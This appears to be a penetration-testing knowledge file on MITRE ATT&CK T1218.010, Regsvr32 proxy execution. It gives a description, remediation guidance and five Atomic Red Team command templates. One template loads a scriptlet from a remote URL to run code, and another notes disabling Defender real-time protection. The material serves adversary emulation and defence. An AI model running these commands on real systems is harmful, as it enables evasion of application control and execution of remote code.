---
name: "T1218.010_regsvr32"
description: "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1218.010
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1218.010"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1218/010"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1218
  - T1218.001
  - T1218.002
  - T1218.003
  - T1218.004
  - T1218.005
  - T1218.007
  - T1218.008
  - T1218.009
  - T1218.011
  - T1218.012
  - T1218.013
  - T1218.014
  - T1218.015
prerequisites:
  - T1218
severity_boost:
  T1218: "Chain with T1218 for deeper attack path"
  T1218.001: "Chain with T1218.001 for deeper attack path"
  T1218.002: "Chain with T1218.002 for deeper attack path"
---

# T1218.010 Regsvr32

> **Sub-technique of:** T1218

## High-Level Description

Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments.

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Regsvr32 technique is applicable to target environment
- [ ] Check Windows systems for indicators of Regsvr32
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Regsvr32 local COM scriptlet execution

Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows

```cmd
#{regsvr32path}\#{regsvr32name} /s /u /i:"#{filename}" scrobj.dll
```

**Dependencies:**

- Regsvr32.sct must exist on disk at specified location (#{filename})

### Atomic Test 2: Regsvr32 remote COM scriptlet execution

Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows

```cmd
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
```

### Atomic Test 3: Regsvr32 local DLL execution

Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows

```cmd
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
```

**Dependencies:**

- AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})

### Atomic Test 4: Regsvr32 Registering Non DLL

Replicating observed Gozi maldoc behavior registering a dll with an altered extension

**Supported Platforms:** windows

```cmd
#{regsvr32path}\#{regsvr32name} /s #{dll_file}
```

**Dependencies:**

- Test requires a renamed dll file

### Atomic Test 5: Regsvr32 Silent DLL Install Call DllRegisterServer

Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.

**Supported Platforms:** windows

```cmd
#{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
```

**Dependencies:**

- AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Regsvr32 by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1218.010 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1050 Exploit Protection

Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass application control. Identify and block potentially malicious software executed through regsvr32 functionality by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.

## Detection

### Detection Strategy for System Binary Proxy Execution: Regsvr32

## Risk Assessment

| Finding                       | Severity | Impact          |
| ----------------------------- | -------- | --------------- |
| Regsvr32 technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [FireEye Regsvr32 Targeting Mongolian Gov](https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html)
- [LOLBAS Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- [Microsoft Regsvr32](https://support.microsoft.com/en-us/kb/249873)
- [Carbon Black Squiblydoo Apr 2016](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/)
- [Atomic Red Team - T1218.010](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218.010)
- [MITRE ATT&CK - T1218.010](https://attack.mitre.org/techniques/T1218/010)
